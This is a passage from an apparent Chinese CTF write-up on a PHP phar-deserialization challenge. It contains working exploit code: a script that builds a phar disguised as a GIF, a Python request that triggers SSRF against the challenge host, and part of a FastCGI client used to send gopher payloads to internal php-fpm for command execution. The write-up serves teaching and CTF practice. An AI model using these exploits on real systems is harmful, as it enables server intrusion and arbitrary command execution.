class="keyword">echo</span> <span class="keyword">$this</span>-&gt;curl(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">    $check = getimagesize($_POST[<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is an image - "</span> . $check[<span class="string">"mime"</span>] . <span class="string">"."</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is not an image."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Main类里的<code>__destruct()</code>居然存在反序列化，很有意思。然后如果绕过这个点将执行一段<code>curl</code>，这又是ssrf的点了。但是我们又要绕过<code>getimagesize</code>的检查，这就得利用到phar反序列化了，因为phar能绕过绝大部分文件的检查。<br>既然如此先ssrf读文件<br>那么构造exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $test=<span class="string">"1"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">funny_get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url=<span class="string">"file:///etc/hosts"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">        curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">        $output=curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $this_is_a_easy_test=unserialize($_GET[<span class="string">'careful'</span>]);</span><br><span class="line">        <span class="keyword">if</span>($this_is_a_easy_test-&gt;funny_get() === <span class="string">'1'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;curl(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">'phar.phar'</span>);</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$o = <span class="keyword">new</span> Main();</span><br><span class="line">$p-&gt;setMetadata($o);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Easytest();</span><br><span class="line"><span class="keyword">echo</span> (urlencode(serialize($a)));<span class="comment">#O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D</span></span><br></pre></td></tr></table></figure><p>生成的phar文件改后缀为gif,jpeg，可以绕过上传。而打印出的用于触发ssrf的魔术方法的反序列化数据则传到url中。之后再用<code>phar://</code>伪协议触发。这样我们就直接写出用于触发phar反序列化的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://290b80a5-0d25-41e3-a73d-d01107cce539.node3.buuoj.cn/catchmime.php?careful=O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D'</span></span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">'name'</span>:<span class="string">'phar://uploads/d388a7ce2d.gif'</span>,</span><br><span class="line">    <span class="string">'submit'</span>:<span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>接下来就是ssrf利用了，此处依旧是打内网。探测完</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;bash</span><br><span class="line">::1localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0ip6-localnet</span><br><span class="line">ff00::0ip6-mcastprefix</span><br><span class="line">ff02::1ip6-allnodes</span><br><span class="line">ff02::2ip6-allrouters</span><br><span class="line">173.0.168.9osrc</span><br></pre></td></tr></table></figure><p>此时顺着主机探测<code>http://173.0.168.10</code>，可以发现有回显<br><img src="/2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/2.PNG" alt="存活主机"><br>php-FPM要怎么利用呢？这里要提到p牛的文章：<br><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p>具体p牛写的很详细,我们知道的，就是可以直接拿脚本利用这点，使用gopher协议传输tcp数据攻击内网，达到任意命令执行。<br>使用如下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">"""A Fast-CGI Client for Python"""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, port, timeout, keepalive)</span>:</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span><span class="params">(self, fcgi_type, content, requestid)</span>:</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">'version'</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">'type'</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">'requestId'</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">'contentLength'</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">'paddingLength'</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">'reserved'</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span><span class="params">(self, buffer)</span>:</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">'content'</span>] = <span class="string">b''</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'contentLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">'contentLength'</span>])</span><br><span class="line">                record[<span class="string">'content'</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'paddingLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">'paddingLength'</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, nameValuePairs=&#123;&#125;, post=<span class="string">''</span>)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__connect():</span><br><span class="line">            print(<span class="string">'connect failure! please check your fasctcgi-server !!'</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b""</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        self.sock.send(request)</span><br><span class="line">        self.requests[requestId][<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_SEND</span><br><span class="line">        self.requests[requestId][<span class="string">'response'</span>] = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">return</span> self.__waitForResponse(requestId)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gopher</span><span class="params">(self, nameValuePairs=&#123;&#125;, post=<span class="string">''</span>)</span>:</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b""</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b''</span>, requestId)</span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span><span class="params">(self, requestId)</span>:</span></span><br><span class="line">        data = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">'type'</span>] == 